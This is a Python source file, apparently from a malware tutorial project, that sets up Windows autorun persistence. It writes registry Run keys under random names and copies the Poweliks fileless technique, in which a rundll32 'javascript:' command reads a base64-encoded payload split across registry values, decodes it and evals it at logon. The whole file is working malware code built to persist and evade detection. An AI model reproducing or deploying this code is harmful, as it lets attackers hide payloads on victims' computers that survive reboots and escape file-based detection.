from _winreg import *
import random
import string
import base64
import os

#http://www.primalsecurity.net/0xc-python-tutorial-python-malware/
def registry_check(run,marker):
    runkey =[]
    try: # no clue why i can not merge all these
        key = OpenKey(HKEY_LOCAL_MACHINE, run, 0, KEY_ALL_ACCESS)
        HKEY = HKEY_LOCAL_MACHINE
        HK = 'HKLM'
    except WindowsError:
        pass
    try:
        key = OpenKey(HKEY_CURRENT_USER, run, 0, KEY_ALL_ACCESS)
        HKEY = HKEY_CURRENT_USER
        HK = 'HKCU'
    except WindowsError:
        pass
    i = 0
    try:
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[1][:len(marker)])
            i += 1
    except WindowsError:
        pass

    print runkey
    return HKEY, HK, runkey

def binary_startup(bin_path):
    run = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
    marker = os.getenv('TEMP')
    HKEY, HK, runkey = registry_check(run,marker)

    # Set autorun key:
    if marker not in runkey:
        #create random names for each registry entry
        randname=''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
        
        Key = OpenKey(HKEY, run, 0, KEY_WRITE)
        SetValueEx(Key, randname, 0, REG_SZ, bin_path)
        CloseKey(Key)

def javascript_startup(bin_data):
    run = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
    marker = 'C:\\WINDOWS\\system32\\rundll32.exe'
    HKEY, HK, runkey = registry_check(run,marker)

    # Set autorun key:
    if marker not in runkey:
        #https://msdn.microsoft.com/en-us/library/windows/desktop/ms724872%28v=vs.85%29.aspx
        #does randomized value data length matter in any way? if not get rid of it, if it does help in any way make it more random for each entry
        n = 16383# - (random.randint(6,12) * random.randint(10,100))  
        bin_b64_data = [bin_data[i:i+n] for i in range(0, len(bin_data), n)]

        # original poweliks reg script to load encoded js
        js_main = 'C:\\WINDOWS\\system32\\rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write("\74script language=jscript.encode>"+(new%%20activexobject("wscript.shell")).regread("%s\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")+"\74/script>")' % (HK)

        #combination of below:
        #https://github.com/rpgeeganage/file-less-ransomware-demo/blob/master/payload.js
        #https://gallery.technet.microsoft.com/scriptcenter/JScriptJavascript-function-d5ab014
        # var HKEY_CURRENT_USER=0x80000001 is the splitting point
        # b64 decoder entry for encoded binary
        js_decoder = """var base64={};base64.PADCHAR='=';base64.ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';base64.makeDOMException=function(){var e,tmp;try{return new DOMException(DOMException.INVALID_CHARACTER_ERR)}catch(tmp){var ex=new Error('DOM Exception 5');ex.code=ex.number=5;ex.name=ex.description='INVALID_CHARACTER_ERR';ex.toString=function(){return'Error: '+ex.name+': '+ex.message};return ex}};base64.getbyte64=function(s,i){var idx=base64.ALPHA.indexOf(s.charAt(i));if(idx===-1){throw base64.makeDOMException();}return idx};base64.decode=function(s){s=''+s;var getbyte64=base64.getbyte64;var pads,i,b10;var imax=s.length;if(imax===0){return s}if(imax%%4!==0){throw base64.makeDOMException();}pads=0;if(s.charAt(imax-1)===base64.PADCHAR){pads=1;if(s.charAt(imax-2)===base64.PADCHAR){pads=2}imax-=4}var x=[];for(i=0;i<imax;i+=4){b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6)|getbyte64(s,i+3);x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff,b10&0xff))}switch(pads){case 1:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6);x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff));break;case 2:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12);x.push(String.fromCharCode(b10>>16));break}return x.join('')};base64.getbyte=function(s,i){var x=s.charCodeAt(i);if(x>255){throw base64.makeDOMException();}return x};base64.encode=function(s){if(arguments.length!==1){throw new SyntaxError('Not enough arguments');}var padchar=base64.PADCHAR;var alpha=base64.ALPHA;var getbyte=base64.getbyte;var i,b10;var x=[];s=''+s;var imax=s.length-s.length%%3;if(s.length===0){return s}for(i=0;i<imax;i+=3){b10=(getbyte(s,i)<<16)|(getbyte(s,i+1)<<8)|getbyte(s,i+2);x.push(alpha.charAt(b10>>18));x.push(alpha.charAt((b10>>12)&0x3F));x.push(alpha.charAt((b10>>6)&0x3f));x.push(alpha.charAt(b10&0x3f))}switch(s.length-imax){case 1:b10=getbyte(s,i)<<16;x.push(alpha.charAt(b10>>18)+alpha.charAt((b10>>12)&0x3F)+padchar+padchar);break;case 2:b10=(getbyte(s,i)<<16)|(getbyte(s,i+1)<<8);x.push(alpha.charAt(b10>>18)+alpha.charAt((b10>>12)&0x3F)+alpha.charAt((b10>>6)&0x3f)+padchar);break}return x.join('')};var HKEY_CURRENT_USER=0x80000001;var HKEY_LOCAL_MACHINE=0x80000002;var REG_SZ=1;var regkey='SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\';var machine_name='.';Values=regGetChildValues(machine_name,%s,regkey);if(Values.Results==0){break;}else{var WshShell=new ActiveXObject("WScript.Shell");var key_value;var key_value_cat;for(i=0;i<Values.Results;i++){if(Values.Types[i]==REG_SZ){key_value=WshShell.RegRead('%s\\'+regkey+'\\'+Values.Names[i]);key_value_cat+=key_value;}}WScript.Echo(key_value_cat.replace('undefined',''));eval(base64.decode(key_value_cat));}function regGetChildValues(strComputer,regRoot,strRegPath){try{var aNames=[];var aTypes=[];var objLocator=new ActiveXObject("WbemScripting.SWbemLocator");var objService=objLocator.ConnectServer(strComputer,"root\\default");var objReg=objService.Get("StdRegProv");var objMethod=objReg.Methods_.Item("EnumValues");var objInParam=objMethod.InParameters.SpawnInstance_();objInParam.hDefKey=regRoot;objInParam.sSubKeyName=strRegPath;var objOutParam=objReg.ExecMethod_(objMethod.Name, objInParam);switch(objOutParam.ReturnValue){case 0:aNames=(objOutParam.sNames!= null)?objOutParam.sNames.toArray():null;aTypes=(objOutParam.Types!=null)?objOutParam.Types.toArray():null;break;case 2:aNames.length=0;break;}}catch(e){return{Results:0,Names:null,Types:null};}return {Results:aNames.length,Names:aNames,Types:aTypes};};""" % (HKEY,HK)

        js_name = ''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])
        decoder_name = ''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))])

        key = OpenKey(HKEY, run, 0, KEY_WRITE)  #HKEY CUR USER/LOCAL Machone
        SetValueEx(key, js_name, 0, REG_SZ, js_main)
        SetValueEx(key, decoder_name, 0, REG_SZ, js_decoder)
        CloseKey(key)

        randname = []
        for n in bin_b64_data:
            randname.append(''.join([random.choice(string.ascii_lowercase) for i in range(0,random.randint(6,12))]))

        b64_key = OpenKey(HKEY, run, 0, KEY_WRITE)  #HKEY CUR USER/LOCAL Machone
        for d in range(len(randname)):
            SetValueEx(b64_key, sorted(randname)[d], 0, REG_SZ, bin_b64_data[d])
        CloseKey(b64_key)
